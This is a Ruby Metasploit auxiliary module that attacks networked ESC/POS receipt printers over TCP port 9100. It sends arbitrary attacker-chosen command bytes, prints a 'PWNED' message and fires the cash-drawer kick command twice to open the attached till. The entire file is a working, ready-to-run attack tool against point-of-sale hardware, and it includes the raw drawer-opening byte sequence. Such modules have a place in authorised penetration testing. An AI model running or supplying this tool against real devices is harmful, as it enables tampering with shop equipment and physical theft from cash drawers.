# encoding: utf-8
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ESC/POS Printer Command Injector',
      'Description' => %q{
        This module sends arbitrary ESC/POS commands to a network printer over TCP.
        By default, it prints "PWNED" and triggers the attached cash drawer twice.
        You can override the print message or provide custom hex commands.
      },
      'Author'      => ['FutileSkills'],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RHOST(),                # Target IP
        Opt::RPORT(9100),            # Default printer port
        OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']),
        OptString.new('HEX_COMMANDS', [false, 'Custom hex commands to send before printing'])
      ]
    )
  end

  # Cash drawer command
  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32"

  def run
    message = datastore['MESSAGE']
    hex_commands = datastore['HEX_COMMANDS']

    # If custom hex commands are provided, convert them from escaped string to actual bytes
    if hex_commands && !hex_commands.empty?
      begin
        # Replace \xNN sequences with actual bytes
        custom_bytes = [hex_commands.gsub(/\\x([0-9A-Fa-f]{2})/, '\1')].pack('H*')
        connect
        sock.put(custom_bytes)
        disconnect
        print_status("Sent custom hex commands to #{rhost}")
      rescue => e
        print_error("Failed to send HEX_COMMANDS: #{e}")
      end
    end

    # ESC/POS print commands: initialize, center, double-size font for message, reset alignment, cut
    print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"

    begin
      print_status("Sending print message to #{rhost}...")
      connect
      sock.put(print_commands)
      disconnect

      sleep(1)

      2.times do
        connect
        sock.put(DRAWER_COMMAND)
        disconnect
        sleep(0.5)
      end

      print_good("Finished sending commands to #{rhost}")
    rescue ::Rex::ConnectionError
      print_error("Failed to connect to #{rhost}")
    end
  end
end
